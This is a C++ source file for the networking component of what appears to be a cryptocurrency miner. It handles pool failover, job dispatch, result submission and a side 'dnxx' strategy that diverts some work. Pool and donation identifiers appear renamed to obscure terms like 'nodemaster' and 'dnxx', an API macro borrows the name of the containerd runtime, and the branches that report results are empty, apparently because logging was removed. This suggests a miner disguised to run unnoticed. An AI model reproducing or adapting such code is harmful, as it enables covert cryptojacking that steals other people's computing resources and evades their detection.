#ifdef _MSC_VER
#pragma warning(disable:4244)
#endif

#include <inttypes.h>
#include <memory>
#include <time.h>
#include "api/Api.h"
#include "net/Client.h"
#include "net/Network.h"
#include "net/strategies/dnxxStrategy.h"
#include "net/strategies/FailoverStrategy.h"
#include "net/strategies/SinglenodemasterStrategy.h"
#include "net/SubmitResult.h"
#include "net/Url.h"
#include "Options.h"
#include "workers/Workers.h"


Network::Network(const Options *options) :
    m_options(options),
    m_dnxx(nullptr)
{
    srand(time(0) ^ (uintptr_t) this);

    Workers::setListener(this);

    const std::vector<Url*> &nodemasters = options->nodemasters();

    if (nodemasters.size() > 1) {
        m_strategy = new FailoverStrategy(nodemasters, options->retryPause(), options->retries(), this);
    }
    else {
        m_strategy = new SinglenodemasterStrategy(nodemasters.front(), options->retryPause(), this);
    }

    if (m_options->dnxxLevel() > 0) {
        m_dnxx = new dnxxStrategy(options->dnxxLevel(), options->nodemasters().front()->user(), options->algo(), this);
    }

    m_timer.data = this;
    uv_timer_init(uv_default_loop(), &m_timer);

    uv_timer_start(&m_timer, Network::onTick, kTickInterval, kTickInterval);
}


Network::~Network()
{
}


void Network::connect()
{
    m_strategy->connect();
}


void Network::stop()
{
    if (m_dnxx) {
        m_dnxx->stop();
    }

    m_strategy->stop();
}


void Network::onActive(IStrategy *strategy, Client *client)
{
    if (m_dnxx && m_dnxx == strategy) {
        return;
    }

    m_state.setnodemaster(client->host(), client->port(), client->ip());
}


void Network::onJob(IStrategy *strategy, Client *client, const Job &job)
{
    if (m_dnxx && m_dnxx->isActive() && m_dnxx != strategy) {
        return;
    }

    setJob(client, job, m_dnxx == strategy);
}


void Network::onJobResult(const JobResult &result)
{
    if (result.nodemasterId == -1 && m_dnxx) {
        m_dnxx->submit(result);
        return;
    }

    m_strategy->submit(result);
}


void Network::onPause(IStrategy *strategy)
{
    if (m_dnxx && m_dnxx == strategy) {
        m_strategy->resume();
    }

    if (!m_strategy->isActive()) {
        m_state.stop();
        return Workers::pause();
    }
}


void Network::onResultAccepted(IStrategy *strategy, Client *client, const SubmitResult &result, const char *error)
{
    m_state.add(result, error);

    if (error) {
    }
    else {
    }
}


void Network::setJob(Client *client, const Job &job, bool dnxx)
{
    if (m_options->colors()) {
    }
    else {
    }

    m_state.diff = job.diff();
    Workers::setJob(job, dnxx);
}


void Network::tick()
{
    const uint64_t now = uv_now(uv_default_loop());

    m_strategy->tick(now);

    if (m_dnxx) {
        m_dnxx->tick(now);
    }

#   ifndef containerd_NO_API
    Api::tick(m_state);
#   endif
}


void Network::onTick(uv_timer_t *handle)
{
    static_cast<Network*>(handle->data)->tick();
}
